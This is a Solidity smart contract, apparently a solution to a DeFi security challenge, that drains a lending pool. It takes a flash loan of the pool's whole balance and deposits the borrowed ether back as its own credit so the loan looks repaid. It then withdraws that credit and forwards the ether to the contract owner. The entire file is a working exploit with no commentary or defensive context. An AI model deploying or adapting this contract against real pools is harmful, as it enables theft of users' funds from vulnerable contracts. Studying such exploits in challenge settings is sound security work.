// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

contract EtherReceiver {
  using Address for address payable;

  address payable public pool ;
  address payable owner;

  constructor(address payable _pool) {
   pool = _pool;
   owner = payable(msg.sender);
  }

  function flashLoan() external {
    pool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", pool.balance));
  }

  function execute() external payable {
     pool.functionCallWithValue(abi.encodeWithSignature("deposit()"), msg.value);
  }

  function withdraw() external {
     pool.functionCall(abi.encodeWithSignature("withdraw()"));
  }

  receive() external payable {
    owner.transfer(msg.value);
  }
}